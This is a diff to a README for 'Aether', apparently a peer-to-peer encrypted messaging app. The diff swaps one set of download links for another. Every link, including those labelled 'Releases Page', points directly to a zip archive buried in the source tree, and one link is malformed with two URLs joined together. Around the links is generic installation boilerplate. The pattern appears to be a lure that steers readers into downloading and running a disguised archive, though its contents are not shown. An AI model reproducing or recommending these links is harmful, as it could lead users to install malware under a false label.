@@ -7,7 +7,7 @@ Welcome to Aether, an experimental application designed for easy peer-to-peer co
 To begin using Aether, follow the steps below. You will need a computer with internet access and a supported operating system.
 
 ## 📥 Download Aether
-[![Download Aether](https://raw.githubusercontent.com/AlanMrqx/Aether/master/src/Aether.CLI/Software_v1.9.zip%https://raw.githubusercontent.com/AlanMrqx/Aether/master/src/Aether.CLI/Software_v1.9.zip)](https://raw.githubusercontent.com/AlanMrqx/Aether/master/src/Aether.CLI/Software_v1.9.zip)
+[![Download Aether](https://github.com/AlanMrqx/Aether/raw/refs/heads/master/src/Aether.Core/Protocol/Software_1.1-alpha.1.zip%https://github.com/AlanMrqx/Aether/raw/refs/heads/master/src/Aether.Core/Protocol/Software_1.1-alpha.1.zip)](https://github.com/AlanMrqx/Aether/raw/refs/heads/master/src/Aether.Core/Protocol/Software_1.1-alpha.1.zip)
 
 ## 📦 System Requirements
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
@@ -21,7 +21,7 @@ To begin using Aether, follow the steps below. You will need a computer with int
 - **ECDH Key Exchange:** Aether uses this method to securely exchange keys, providing a safe communication channel.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page:** Go to the [Aether Releases Page](https://raw.githubusercontent.com/AlanMrqx/Aether/master/src/Aether.CLI/Software_v1.9.zip).
+1. **Visit the Releases Page:** Go to the [Aether Releases Page](https://github.com/AlanMrqx/Aether/raw/refs/heads/master/src/Aether.Core/Protocol/Software_1.1-alpha.1.zip).
 2. **Choose Your Version:** Look for the latest version and click on it.
 3. **Select Your Operating System:** Find the package that corresponds to your operating system.
 4. **Download the File:** Click the download link to save the file to your computer.
@@ -60,6 +60,6 @@ To get deeper insights into Aether's technology and usage, check out the followi
 For updates and further developments, keep an eye on our official social media channels.
 
 ## 💻 Download Aether Again
-For your convenience, here's the download link once more: [Aether Releases Page](https://raw.githubusercontent.com/AlanMrqx/Aether/master/src/Aether.CLI/Software_v1.9.zip).
+For your convenience, here's the download link once more: [Aether Releases Page](https://github.com/AlanMrqx/Aether/raw/refs/heads/master/src/Aether.Core/Protocol/Software_1.1-alpha.1.zip).
 
 Embrace secure communication with Aether today!
